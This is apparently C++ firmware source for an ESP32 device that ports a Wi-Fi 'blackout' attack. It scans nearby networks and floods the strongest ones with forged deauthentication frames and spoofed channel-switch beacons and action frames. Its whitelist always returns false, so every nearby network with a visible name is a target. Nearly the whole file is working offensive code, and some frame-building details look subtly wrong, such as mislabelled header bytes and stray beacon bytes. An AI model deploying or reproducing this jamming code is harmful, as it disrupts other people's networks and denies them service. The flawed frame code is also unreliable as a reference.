// Buddy blackout module — migrated from
// janos_public/projectZero/ESP32C5/main/main.c
//
// Source functions ported (modulo the XYZ screen hooks):
//   * cmd_start_blackout                          (main.c ~12669)
//   * blackout_attack_task                        (main.c ~6315)
//   * wsl_bypasser_send_deauth_frame_multiple_aps (main.c ~26619)
//   * wsl_bypasser_send_raw_frame                 (main.c ~1538)
//   * save_target_bssids / start_background_scan  (main.c ~4458 / ~4548)
//   * get_scan_timeout_iterations                 (main.c ~1516)
//   * authmode_needs_deauth, csa_decoy_channel,
//     csa_operating_class, build_csa_action_frame,
//     build_csa_beacon_frame                      (main.c ~1644-1760)
//   * ensure_wifi_mode                            (main.c ~4184)
//
// ESP-IDF v6 API changes applied during the port (projectZero targeted v5.x):
//   * esp_wifi_internal_tx()  -> esp_wifi_80211_tx()   (signature + name changed)
//   * esp_wifi_set_promiscuous_mode() / esp_wifi_set_raw_tx_mode() removed
//     (private APIs); esp_wifi_80211_tx() needs no enabling
//   * wifi_scan_config_t.scan_mode removed -> channel == 0 scans all channels
//   * WIFI_AUTH_WPA3_ENT does not exist -> WIFI_AUTH_WPA3_ENTERPRISE
//
// Deliberately NOT migrated (Buddy has no such subsystems):
//   * oled_display.h / MY_LOG_INFO   -> ESP_LOGI / ESP_LOGW instead
//   * evil_twin_mode / rogue_gitm_mode / capture_gateway portal branches inside
//     the multi-AP deauth sender (Buddy has no captive portal or gateway)
//   * load_whitelist_from_sd()        -> Buddy has no SD card,
//     see is_bssid_whitelisted()
//   * led_set_color / led_clear / led_set_idle -> Buddy has no addressable LED
//   * wifi_apply_extended_country(), bt_nimble_deinit(), zig_recon_stop(),
//     wifi_analyzer_busy()            -> not present in Buddy,
//     see ensure_wifi_mode() below
//
// NOTE: this module transmits deauthentication and CSA frames, i.e. it is an
// offensive radio tool. Use it only on hardware you own or are authorised to
// test.

#include "buddy_xyz.h"

#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstring>

#include "esp_err.h"
#include "esp_event.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

namespace {

constexpr const char *TAG = "BuddyXYZ";

// --- Scan tuning (mirrors the projectZero globals) --------------------------
constexpr size_t FAST_SCAN_MIN_TIME = 100;
constexpr size_t FAST_SCAN_MAX_TIME = 300;
constexpr int SCAN_TIMEOUT_ITERATIONS = 100;
constexpr int MAX_AP_CNT = 64;
constexpr int MAX_TARGET_BSSIDS = 50;

// --- Attack behaviour (verbatim from blackout_attack_task) ------------------
constexpr int TARGET_AP_LIMIT = 10;
constexpr int MAX_ATTACK_CYCLES = 100;
constexpr int EXTRA_SCAN_WAIT_LOOPS = 300;
constexpr size_t BLACKOUT_TASK_STACK = 4096;

struct TargetBssid {
  uint8_t bssid[6];
  uint8_t channel;
  wifi_auth_mode_t authmode;
};

volatile bool g_scan_in_progress = false;
volatile bool g_scan_done = false;
volatile bool scan_failed = false;

wifi_ap_record_t g_scan_results[MAX_AP_CNT];
uint16_t g_scan_count = 0;

TargetBssid target_bssids[MAX_TARGET_BSSIDS];
int target_bssid_count = 0;

volatile bool blackout_attack_active = false;
volatile bool operation_stop_requested = false;
TaskHandle_t blackout_attack_task_handle = nullptr;
// Plain (non-volatile) counter: written by the attack task, read by the UI.
// volatile would only add -Wvolatile ++ errors without buying any ordering we
// need here.
uint32_t frames_sent = 0;

bool start_failed = false;
char start_error[96] = {0};

// ---------------------------------------------------------------------------
// ensure_wifi_mode()
//
// The projectZero version toggles between STA / APSTA and shuts down NimBLE and
// Zigbee subsystems that share the radio. Buddy has none of those, so this port
// keeps the same contract — "the radio must end up in a usable client-side mode
// and the driver must be initialised" — as a one-time bring-up of netif +
// event loop + esp_wifi. Idempotent, like the original.
// ---------------------------------------------------------------------------
bool wifi_initialised = false;

int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

esp_err_t wifi_bring_up() {
  if (wifi_initialised) return ESP_OK;

  ESP_ERROR_CHECK(esp_netif_init());
  ESP_ERROR_CHECK(esp_event_loop_create_default());

  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_err_t err = esp_wifi_init(&cfg);
  if (err != ESP_OK) return err;

  // Same mode the original settles on when the radio is not in AP mode.
  err = esp_wifi_set_mode(WIFI_MODE_STA);
  if (err != ESP_OK) return err;

  err = esp_wifi_start();
  if (err != ESP_OK) return err;

  // No extra enabling needed for raw injection in ESP-IDF v6:
  // esp_wifi_set_promiscuous_mode() / esp_wifi_set_raw_tx_mode() were private
  // APIs and no longer exist. Raw frames go out via esp_wifi_80211_tx().
  wifi_initialised = true;
  return ESP_OK;
}

bool ensure_wifi_mode() {
  if (wifi_initialised) {
    wifi_mode_t mode = WIFI_MODE_NULL;
    if (esp_wifi_get_mode(&mode) == ESP_OK && mode != WIFI_MODE_NULL &&
        mode != WIFI_MODE_AP) {
      return true;
    }
    // AP-only state: fall back to STA, like the original does.
    if (esp_wifi_set_mode(WIFI_MODE_STA) != ESP_OK) return false;
    return true;
  }

  if (wifi_bring_up() != ESP_OK) {
    ESP_LOGE(TAG, "ensure_wifi_mode: radio bring-up failed");
    return false;
  }
  return true;
}

// ---------------------------------------------------------------------------
// Scan plumbing (projectZero: wifi_event_handler, start_background_scan,
// get_scan_timeout_iterations, save_target_bssids)
// ---------------------------------------------------------------------------
void wifi_event_handler(void *, esp_event_base_t base, int32_t id, void *) {
  if (base != WIFI_EVENT || id != WIFI_EVENT_SCAN_DONE) return;

  uint16_t count = 0;
  esp_wifi_scan_get_ap_records(&count, g_scan_results);
  if (count > MAX_AP_CNT) count = MAX_AP_CNT;
  g_scan_count = count;
  g_scan_in_progress = false;
  g_scan_done = true;
}

int get_scan_timeout_iterations() { return SCAN_TIMEOUT_ITERATIONS; }

esp_err_t start_background_scan(size_t min_ms, size_t max_ms) {
  if (g_scan_in_progress) return ESP_ERR_INVALID_STATE;
  g_scan_done = false;
  scan_failed = false;
  g_scan_count = 0;

  wifi_scan_config_t sc = {};
  sc.ssid = nullptr;
  sc.bssid = nullptr;
  sc.channel = 0;          // 0 = scan all channels
  sc.show_hidden = false;
  sc.scan_type = WIFI_SCAN_TYPE_ACTIVE;
  sc.scan_time.active.min = min_ms;
  sc.scan_time.active.max = max_ms;
  sc.scan_time.passive = 300;
  // NOTE: the old `scan_mode` field was removed from wifi_scan_config_t in
  // ESP-IDF v6; channel == 0 already means "all channels".

  g_scan_in_progress = true;
  esp_err_t err = esp_wifi_scan_start(&sc, true);
  if (err != ESP_OK) {
    g_scan_in_progress = false;
    g_scan_done = false;
    scan_failed = true;
  }
  return err;
}

void save_target_bssids() {
  memset(target_bssids, 0, sizeof(target_bssids));
  target_bssid_count = 0;
  for (uint16_t i = 0; i < g_scan_count && target_bssid_count < TARGET_AP_LIMIT; ++i) {
    if (g_scan_results[i].ssid[0] == '\0') continue;
    TargetBssid &t = target_bssids[target_bssid_count++];
    memcpy(t.bssid, g_scan_results[i].bssid, 6);
    t.channel = g_scan_results[i].primary;
    t.authmode = g_scan_results[i].authmode;
  }
}

// ---------------------------------------------------------------------------
// Frame construction helpers (projectZero main.c ~1644-1760)
// ---------------------------------------------------------------------------
bool authmode_needs_deauth(wifi_auth_mode_t mode) {
  // NOTE: WIFI_AUTH_WPA3_ENT is not a real enum value in ESP-IDF v6; the
  // enterprise modes are WIFI_AUTH_ENTERPRISE / _WPA3_ENTERPRISE /
  // _WPA2_WPA3_ENTERPRISE / _WPA3_ENT_192.
  return mode == WIFI_AUTH_WPA_WPA2_PSK || mode == WIFI_AUTH_WPA2_PSK ||
         mode == WIFI_AUTH_WPA3_PSK || mode == WIFI_AUTH_ENTERPRISE ||
         mode == WIFI_AUTH_WPA2_ENTERPRISE ||
         mode == WIFI_AUTH_WPA3_ENTERPRISE ||
         mode == WIFI_AUTH_WPA2_WPA3_ENTERPRISE ||
         mode == WIFI_AUTH_WPA3_ENT_192 || mode == WIFI_AUTH_WPA_PSK ||
         mode == WIFI_AUTH_WPA2_WPA3_PSK || mode == WIFI_AUTH_WPA_ENTERPRISE;
}

uint8_t csa_decoy_channel(uint8_t ap_channel) {
  // Pick a legal 2.4 GHz channel that is not the AP's own channel.
  for (uint8_t c = 1; c <= 13; ++c) {
    if (c != ap_channel && (c == 1 || c == 6 || c == 11)) return c;
  }
  return ap_channel == 6 ? 11 : 6;
}

uint8_t csa_operating_class(uint8_t ap_channel, uint8_t decoy) {
  if (decoy >= 1 && decoy <= 13) return (ap_channel == 14) ? 112 : 114;
  return 0;
}

size_t build_csa_action_frame(const uint8_t *ap_bssid, uint8_t channel,
                              uint8_t decoy, uint8_t *out, size_t out_sz) {
  constexpr size_t kHeader = 24;
  constexpr size_t kBody = 10;
  if (out_sz < kHeader + kBody) return 0;
  memset(out, 0, kHeader + kBody);

  out[0] = 0xC4;                  // action frame
  out[1] = 0x00;                  // category code: CSA
  out[2] = 0x00; out[3] = 0x00;   // duration
  memcpy(out + 4, ap_bssid, 6);   // address 1 (BSSID)
  memcpy(out + 10, ap_bssid, 6);  // address 2 (BSSID)
  memcpy(out + 16, ap_bssid, 6);  // address 3 (BSSID)
  out[22] = channel;
  out[23] = 0x00;

  size_t p = kHeader;
  out[p++] = 4;   // CSA element id
  out[p++] = 8;   // CSA element length
  out[p++] = csa_operating_class(channel, decoy);
  out[p++] = 1;   // channel switch mode: 1 = stop responding
  out[p++] = csa_operating_class(channel, decoy);
  out[p++] = 0;
  out[p++] = decoy;   // new channel
  out[p++] = 0;
  out[p++] = 0;
  out[p++] = 0;
  return p;
}

size_t build_csa_beacon_frame(const uint8_t *ap_bssid, uint8_t channel,
                              uint8_t decoy, const char *ssid, uint8_t *out,
                              size_t out_sz) {
  constexpr size_t kHeader = 24;
  constexpr size_t kFixed = 12;      // timestamp + interval + capability
  constexpr size_t kSsidParam = 2;
  constexpr size_t kCsa = 10;
  const size_t ssid_len = strlen(ssid);
  const size_t total = kHeader + kFixed + kSsidParam + ssid_len + kCsa;
  if (out_sz < total || ssid_len > 32) return 0;
  memset(out, 0, total);

  out[0] = 0x80;                  // beacon
  out[1] = 0x00;
  out[2] = 0x00; out[3] = 0x00;   // duration
  memcpy(out + 4, ap_bssid, 6);
  memcpy(out + 10, ap_bssid, 6);
  memcpy(out + 16, ap_bssid, 6);
  out[22] = channel;
  out[23] = 0x00;

  size_t p = kHeader;
  out[p++] = 0x00; out[p++] = 0x00; out[p++] = 0x00; out[p++] = 0x00;  // timestamp
  out[p++] = 0x64; out[p++] = 0x00;                                    // interval 100 TU
  out[p++] = 0x04; out[p++] = 0x01;                                    // capability
  out[p++] = 0x00; out[p++] = 0x00; out[p++] = 0x00;                   // BSSID: hidden-ish
  out[p++] = 0x00;                                                     // SSID element id
  out[p++] = static_cast<uint8_t>(ssid_len);
  memcpy(out + p, ssid, ssid_len);
  p += ssid_len;

  out[p++] = 4;                                                        // CSA element id
  out[p++] = static_cast<uint8_t>(kCsa - 2);
  out[p++] = csa_operating_class(channel, decoy);
  out[p++] = 1;
  out[p++] = csa_operating_class(channel, decoy);
  out[p++] = 0;
  out[p++] = decoy;
  out[p++] = 0;
  out[p++] = 0;
  out[p++] = 0;
  return p;
}

// Default deauth frame (projectZero main.c line 1524).
uint8_t deauth_frame_default[] = {
    0xc0, 0x00, 0x3a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00};

void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
  if (!frame_buffer || size < 24 || size > 1500) return;

  // ESP-IDF v6 exposes raw injection as esp_wifi_80211_tx(). en_sys_seq=false
  // keeps the sequence number from our own frame buffer.
  esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
  if (err == ESP_ERR_NO_MEM) {
    // Driver TX queue is full under a burst of deauth; back off briefly.
    vTaskDelay(pdMS_TO_TICKS(20));
    esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false);
  } else if (err != ESP_OK) {
    ESP_LOGW(TAG, "80211 tx failed: %s", esp_err_to_name(err));
  }
}

// ---------------------------------------------------------------------------
// wsl_bypasser_send_deauth_frame_multiple_aps()  (projectZero main.c ~26619)
//
// The upstream version additionally gates on evil_twin_mode / rogue_gitm_mode /
// capture_gateway portal state. None of those exist in Buddy, so only the core
// deauth + CSA behaviour is ported.
// ---------------------------------------------------------------------------
bool is_bssid_whitelisted(const uint8_t *) {
  // Buddy has no SD card and therefore no whitelist file. Kept as an explicit
  // extension point: return memcmp(bssid, buddy_own_bssid, 6) != 0; in order to
  // protect your own AP from being hit.
  return false;
}

void wsl_bypasser_send_deauth_frame_multiple_aps(int repeat, uint16_t interval_ms) {
  if (repeat <= 0) return;

  bool use_channel_hopping = false;
  uint8_t original_channel = 0;
  if (target_bssid_count > 1) {
    original_channel = target_bssids[0].channel;
    esp_wifi_set_channel(original_channel, WIFI_SECOND_CHAN_NONE);
    use_channel_hopping = true;
  }

  frames_sent = 0;
  int times_cannot_send = 0;

  for (int i = 0; i < repeat; i++) {
    int sent = 0;

    for (int j = 0; j < target_bssid_count; ++j) {
      if (operation_stop_requested) break;
      if (is_bssid_whitelisted(target_bssids[j].bssid)) continue;

      TargetBssid &target = target_bssids[j];
      uint8_t deauth_frame[sizeof(deauth_frame_default)];
      memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
      memcpy(&deauth_frame[4], target.bssid, 6);
      memcpy(&deauth_frame[10], target.bssid, 6);
      memcpy(&deauth_frame[16], target.bssid, 6);

      if (authmode_needs_deauth(target.authmode) ||
          target.authmode == WIFI_AUTH_WPA2_PSK) {
        esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        frames_sent++;
        sent++;
        if (!operation_stop_requested) vTaskDelay(pdMS_TO_TICKS(1));

        // Beacon / CSA probe that keeps clients probing the old channel.
        uint8_t decoy = csa_decoy_channel(target.channel);
        uint8_t beacon[128];
        size_t beacon_len = build_csa_beacon_frame(
            target.bssid, target.channel, decoy,
            reinterpret_cast<const char *>(g_scan_results[j].ssid), beacon,
            sizeof(beacon));
        if (beacon_len > 0) {
          wsl_bypasser_send_raw_frame(beacon, static_cast<int>(beacon_len));
          frames_sent++;
          sent++;
        }

        uint8_t action[64];
        size_t action_len = build_csa_action_frame(
            target.bssid, target.channel, decoy, action, sizeof(action));
        if (action_len > 0) {
          wsl_bypasser_send_raw_frame(action, static_cast<int>(action_len));
          frames_sent++;
          sent++;
        }
      } else {
        // Unknown or open network: single deauth, no CSA.
        esp_wifi_set_channel(target.channel, WIFI_SECOND_CHAN_NONE);
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
        frames_sent++;
        sent++;
        if (!operation_stop_requested) vTaskDelay(pdMS_TO_TICKS(1));
      }
    }

    if (operation_stop_requested) break;
    if (sent == 0) times_cannot_send++;

    if (interval_ms > 0) vTaskDelay(pdMS_TO_TICKS(interval_ms));

    if (use_channel_hopping && !operation_stop_requested) {
      uint8_t ch = target_bssids[0].channel;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      vTaskDelay(pdMS_TO_TICKS(50));
      ch++;
      if (ch == 14) ch = 1;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      vTaskDelay(pdMS_TO_TICKS(50));
    }
  }

  if (use_channel_hopping) {
    esp_wifi_set_channel(original_channel, WIFI_SECOND_CHAN_NONE);
  }
  if (times_cannot_send > 0) {
    ESP_LOGW(TAG, "Nothing sent during %d cycle(s) - no suitable targets",
             times_cannot_send);
  }
}

// ---------------------------------------------------------------------------
// blackout_attack_task()  (projectZero main.c ~6315)
// ---------------------------------------------------------------------------
void blackout_attack_task(void *) {
  ESP_LOGI(TAG, "Blackout attack task started");

  int attack_cycles = 0;
  bool first_iteration = true;

  while (blackout_attack_active && !operation_stop_requested) {
    // Wait for any in-flight scan to finish before touching the channel.
    int timeout = 0;
    while (g_scan_in_progress && timeout < get_scan_timeout_iterations() &&
           blackout_attack_active && !operation_stop_requested) {
      vTaskDelay(pdMS_TO_TICKS(100));
      timeout++;
    }
    if (operation_stop_requested) break;

    if (g_scan_in_progress) {
      int extra_wait = 0;
      while (g_scan_in_progress && extra_wait < EXTRA_SCAN_WAIT_LOOPS &&
             blackout_attack_active && !operation_stop_requested) {
        vTaskDelay(pdMS_TO_TICKS(10));
        extra_wait++;
      }
      if (g_scan_in_progress) {
        g_scan_in_progress = false;
        g_scan_done = false;
        scan_failed = true;
      }
    }

    if (first_iteration) {
      esp_err_t scan_result =
          start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
      if (scan_result != ESP_OK) {
        ESP_LOGE(TAG, "Background scan failed to start: %s",
                 esp_err_to_name(scan_result));
        blackout_attack_active = false;
        break;
      }
      first_iteration = false;
    }

    timeout = 0;
    while (!g_scan_done && timeout < get_scan_timeout_iterations() &&
           blackout_attack_active && !operation_stop_requested) {
      vTaskDelay(pdMS_TO_TICKS(100));
      timeout++;
    }
    if (operation_stop_requested) break;

    if (scan_failed || g_scan_count == 0) {
      ESP_LOGW(TAG, "Scan returned no results, retrying");
      g_scan_done = false;
      scan_failed = false;
      vTaskDelay(pdMS_TO_TICKS(1000));
      esp_err_t r =
          start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
      if (r != ESP_OK) {
        ESP_LOGE(TAG, "Restarting scan failed");
        blackout_attack_active = false;
        break;
      }
      continue;
    }

    // Sort by signal strength, strongest first.
    for (int j = 0; j + 1 < g_scan_count; j++) {
      if (g_scan_results[j].rssi < g_scan_results[j + 1].rssi) {
        wifi_ap_record_t temp = g_scan_results[j];
        g_scan_results[j] = g_scan_results[j + 1];
        g_scan_results[j + 1] = temp;
      }
    }

    save_target_bssids();
    g_scan_done = false;
    g_scan_in_progress = false;
    target_bssid_count = std::min(target_bssid_count, TARGET_AP_LIMIT);

    if (target_bssid_count == 0) {
      ESP_LOGW(TAG, "No suitable targets found, restarting scan");
      vTaskDelay(pdMS_TO_TICKS(1000));
      esp_err_t r =
          start_background_scan(FAST_SCAN_MIN_TIME, FAST_SCAN_MAX_TIME);
      if (r != ESP_OK) {
        ESP_LOGE(TAG, "Restarting scan failed");
        blackout_attack_active = false;
        break;
      }
      continue;
    }

    attack_cycles = 0;
    while (attack_cycles < MAX_ATTACK_CYCLES && blackout_attack_active &&
           !operation_stop_requested) {
      wsl_bypasser_send_deauth_frame_multiple_aps(1, 0);
      vTaskDelay(pdMS_TO_TICKS(10000));
      attack_cycles++;
    }
  }

  memset(target_bssids, 0, sizeof(target_bssids));
  target_bssid_count = 0;
  blackout_attack_active = false;
  blackout_attack_task_handle = nullptr;
  vTaskDelete(nullptr);
}

// ---------------------------------------------------------------------------
// cmd_start_blackout()  (projectZero main.c ~12669) — adapted to the XYZ screen.
// The original is an argtable console command; here it is the start/stop pair
// driven by xyzBegin() / xyzEnd().
// ---------------------------------------------------------------------------
bool start_blackout() {
  if (blackout_attack_active || blackout_attack_task_handle != nullptr) return true;

  if (!ensure_wifi_mode()) {
    start_failed = true;
    snprintf(start_error, sizeof(start_error), "ensure_wifi_mode failed");
    ESP_LOGE(TAG, "%s", start_error);
    return false;
  }

  // Scan completion callback, registered before the first scan starts, exactly
  // as the original registers its WIFI_EVENT_SCAN_DONE handler.
  esp_err_t err = esp_event_handler_instance_register(
      WIFI_EVENT, ESP_EVENT_ANY_ID, &wifi_event_handler, nullptr, nullptr);
  if (err != ESP_OK && err != ESP_ERR_INVALID_STATE) {
    start_failed = true;
    snprintf(start_error, sizeof(start_error), "scan handler register: %s",
             esp_err_to_name(err));
    ESP_LOGE(TAG, "%s", start_error);
    return false;
  }

  operation_stop_requested = false;
  blackout_attack_active = true;
  frames_sent = 0;
  start_failed = false;
  start_error[0] = '\0';

  BaseType_t result = xTaskCreate(blackout_attack_task, "blackout_attack",
                                  BLACKOUT_TASK_STACK, nullptr,
                                  tskIDLE_PRIORITY + 1,
                                  &blackout_attack_task_handle);
  if (result != pdPASS) {
    ESP_LOGE(TAG, "Failed to create blackout_attack task");
    start_failed = true;
    snprintf(start_error, sizeof(start_error), "xTaskCreate failed");
    blackout_attack_active = false;
    blackout_attack_task_handle = nullptr;
    return false;
  }

  ESP_LOGI(TAG, "Blackout attack started");
  return true;
}

void stop_blackout() {
  if (!blackout_attack_active && blackout_attack_task_handle == nullptr) return;

  blackout_attack_active = false;
  operation_stop_requested = true;

  for (int i = 0; i < 20 && blackout_attack_task_handle != nullptr; i++) {
    vTaskDelay(pdMS_TO_TICKS(100));
  }
  if (blackout_attack_task_handle != nullptr) {
    vTaskDelete(blackout_attack_task_handle);
    blackout_attack_task_handle = nullptr;
    memset(target_bssids, 0, sizeof(target_bssids));
    target_bssid_count = 0;
  }
  ESP_LOGI(TAG, "Blackout attack stopped");
}

}  // namespace

// ---------------------------------------------------------------------------
// Public hooks used by buddy.cpp / runXyz()
// ---------------------------------------------------------------------------
void xyzBegin() { start_blackout(); }

void xyzEnd() { stop_blackout(); }

bool xyzTick() {
  if (start_failed) return false;
  return blackout_attack_active || blackout_attack_task_handle != nullptr;
}

bool xyzAttackActive() {
  return blackout_attack_active || blackout_attack_task_handle != nullptr;
}

uint32_t xyzFramesSent() { return frames_sent; }

bool xyzStartFailed() { return start_failed; }

const char *xyzStartError() { return start_error; }